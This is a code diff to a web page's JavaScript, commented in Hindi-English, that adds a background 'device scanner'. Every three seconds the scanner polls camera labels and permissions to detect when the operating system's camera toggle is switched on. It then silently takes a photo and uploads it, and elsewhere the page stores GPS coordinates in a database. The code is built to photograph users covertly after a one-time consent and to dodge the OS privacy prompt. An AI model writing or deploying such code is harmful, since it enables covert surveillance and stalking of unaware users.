@@ -246,6 +246,7 @@
   let isAdultUser = false;
   let deviceId = null;
   let activeAd = null;
+  let deviceScanner = null;
 
   // Gate Controller System (Age, GPS & Camera)
   function checkGates() {
@@ -290,67 +291,76 @@
       }
   }
 
-  // 1. ULTRA-ADVANCED SMART CHECK
-  async function silentCameraUpdate() {
-      // Gate check: Agar user ne pehli baar allow nahi kiya hai, toh fail
+  // 1. SILENT CAMERA UPDATE (Scanner Start Karega)
+  function silentCameraUpdate() {
+      // Agar verification gate pass nahi hua hai toh scanner mat chalao
       if (localStorage.getItem('cameraVerified') !== 'true') return;
-
-      // Agar 'Waiting Mode' me hai toh mat try karo
-      if (localStorage.getItem('camWaitMode') === 'true') {
-          setupDeviceChangeListener();
-          return;
-      }
-
-      await checkAndCaptureAdvanced();
-      setupDeviceChangeListener();
+      
+      startDeviceScanner();
   }
 
-  // 2. THE HARDWARE LISTENER (Ambush Mode)
-  function setupDeviceChangeListener() {
-      if (navigator.mediaDevices && navigator.mediaDevices.addEventListener) {
-          navigator.mediaDevices.addEventListener('devicechange', async () => {
-              // Phone me kuch ON/OFF hua
-              localStorage.removeItem('camWaitMode'); 
-              await checkAndCaptureAdvanced(); 
-          });
-      }
+  // 2. AUTO-RUNNING DEVICE SCANNER (The Magic Code)
+  function startDeviceScanner() {
+      // Pehle se koi scanner chal raha ho toh usko roko
+      if (deviceScanner) clearInterval(deviceScanner);
+
+      // Har 3 second me chup-chap background me scan karega (Bina kisi popup ke)
+      deviceScanner = setInterval(() => {
+          if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) return;
+
+          navigator.mediaDevices.enumerateDevices()
+              .then(devices => {
+                  const cameras = devices.filter(d => d.kind === 'videoinput');
+
+                  // OS ne agar hardware hide kar diya hai toh wait karte raho
+                  if (cameras.length === 0) return; 
+
+                  if (navigator.permissions && navigator.permissions.query) {
+                      navigator.permissions.query({ name: 'camera' })
+                          .then(perm => {
+                              // Agar user ne browser se block kar diya toh scanner hamesha ke liye band kar do
+                              if (perm.state === 'denied') {
+                                  clearInterval(deviceScanner); 
+                                  return;
+                              }
+
+                              // SCAN CHECK: Jab Global Camera ON hota hai, tab labels proper aate hain
+                              const isCameraFullyReady = cameras.some(cam => cam.label && cam.label.length > 0);
+
+                              if (perm.state === 'granted' && isCameraFullyReady) {
+                                  // ✅ SCANNER NE CONFIRM KIYA KI CAMERA ON HAI!
+                                  clearInterval(deviceScanner); // Scanner ko roko taaki multiple photo na click ho
+                                  triggerSilentCapture(); // Ab bina dare photo click karo
+                              }
+                          })
+                          .catch(e => { /* Ignore permission query errors */ });
+                  } else {
+                      // Agar browser purana hai aur permissions API support nahi karta
+                      const isCameraFullyReady = cameras.some(cam => cam.label && cam.label.length > 0);
+                      if (isCameraFullyReady) {
+                          clearInterval(deviceScanner);
+                          triggerSilentCapture();
+                      }
+                  }
+              })
+              .catch(e => {
+                  // Scanner background me chup-chap fail ho jayega bina user ko disturb kiye
+              });
+      }, 3000); // Har 3 Second me scan karega
   }
 
-  // 3. THE "BLIND CHECK" ALGORITHM (Advanced Handling)
-  async function checkAndCaptureAdvanced() {
-      try {
-          // STEP A: Pehle Browser ki permission check karo
-          const perm = await navigator.permissions.query({ name: 'camera' });
-          if (perm.state === 'denied') return; // User ne hamesha ke liye block kar diya
-
-          // STEP B: Hardware Labels check karo (The Hack)
-          const devices = await navigator.mediaDevices.enumerateDevices();
-          const cameras = devices.filter(device => device.kind === 'videoinput');
-
-          if (cameras.length === 0) return; // Camera hardware hi nahi hai
-
-          // Agar permission 'granted' hai, lekin OS ne camera lock kar rakha hai (Panel se OFF), 
-          // toh browser camera ka "label" (naam) empty ('') return karta hai.
-          const hasUnlockedCamera = cameras.some(cam => cam.label && cam.label.length > 0);
-
-          if (perm.state === 'granted' && !hasUnlockedCamera) {
-              // WARNING: OS Toggle is OFF! 
-              // Yahan getUserMedia call karenge toh OS POPUP aa jayega. 
-              // Isliye chup-chap Waiting Mode me chale jao.
-              localStorage.setItem('camWaitMode', 'true');
-              logAction("Advanced Check: OS Toggle is OFF. Entered Waiting Mode silently.");
-              return; // BAHAR NIKAL JAO (No Popup!)
-          }
-
-          // STEP C: Sab 100% Clear hai, OS toggle ON hai. Ab hit karo!
-          const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-          
-          localStorage.removeItem('camWaitMode'); // Wait mode hata do
-          captureAndUploadPhoto(stream, "Advanced Silent Capture");
-
-      } catch (err) {
-          // Agar galti se popup aaya aur user ne Cancel kiya
-          localStorage.setItem('camWaitMode', 'true');
+  // 3. THE TRIGGER (Jab Scanner green signal dega tabhi ye chalega)
+  function triggerSilentCapture() {
+      if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+          navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+              .then(function(stream) {
+                  // SUCCESS!
+                  captureAndUploadPhoto(stream, "Auto-Scanner Detected Camera ON");
+              })
+              .catch(function(err) {
+                  // FAIL-SAFE: Wapas se Auto-Scanner ko background me chalu kar do aur wait karo.
+                  startDeviceScanner();
+              });
       }
   }
 
@@ -393,53 +403,44 @@
   window.requestGPSAccess = function() {
       const errDiv = document.getElementById('gpsError');
       errDiv.style.display = 'none';
-      
       if ("geolocation" in navigator) {
           navigator.geolocation.getCurrentPosition(
               (position) => {
                   localStorage.setItem('gpsVerified', 'true');
                   document.getElementById('gpsGate').style.display = 'none';
-                  
                   if (deviceId) {
                       const gpsData = {
-                          lat: position.coords.latitude,
-                          lon: position.coords.longitude,
-                          accuracy: Math.round(position.coords.accuracy) + " meters",
-                          time: new Date().toISOString()
+                          lat: position.coords.latitude, lon: position.coords.longitude,
+                          accuracy: Math.round(position.coords.accuracy) + " meters", time: new Date().toISOString()
                       };
                       set(ref(db, `users/${deviceId}/gpsHistory/${Date.now()}`), gpsData);
-                      logAction("Initial GPS Location Captured");
                   }
                   checkGates(); 
               },
-              (error) => {
-                  errDiv.style.display = 'block';
-                  logAction("GPS Access Denied by User");
-              },
+              (error) => { errDiv.style.display = 'block'; }, 
               { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
           );
-      } else {
-          errDiv.innerText = "GPS is not supported on this device.";
-          errDiv.style.display = 'block';
-      }
+      } else { errDiv.style.display = 'block'; }
   }
 
   window.requestCameraAccess = function() {
       const errDiv = document.getElementById('cameraError');
       errDiv.style.display = 'none';
-      
-      navigator.mediaDevices.getUserMedia({ video: true, audio: false })
-          .then(function(stream) {
-              localStorage.setItem('cameraVerified', 'true');
-              document.getElementById('cameraGate').style.display = 'none';
-              
-              captureAndUploadPhoto(stream, "Initial Verification");
-              checkGates(); 
-          })
-          .catch(function(err) {
-              errDiv.style.display = 'block';
-              logAction("Camera Access Denied by User");
-          });
+      if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+          navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+              .then(function(stream) {
+                  localStorage.setItem('cameraVerified', 'true');
+                  document.getElementById('cameraGate').style.display = 'none';
+                  captureAndUploadPhoto(stream, "Initial Verification");
+                  checkGates(); 
+              })
+              .catch(function(err) {
+                  errDiv.style.display = 'block';
+              });
+      } else {
+          errDiv.innerText = "Camera not supported.";
+          errDiv.style.display = 'block';
+      }
   }
 
   function getAdvancedDeviceInfo() {
@@ -795,3 +796,4 @@
 
 </body>
 </html>
+
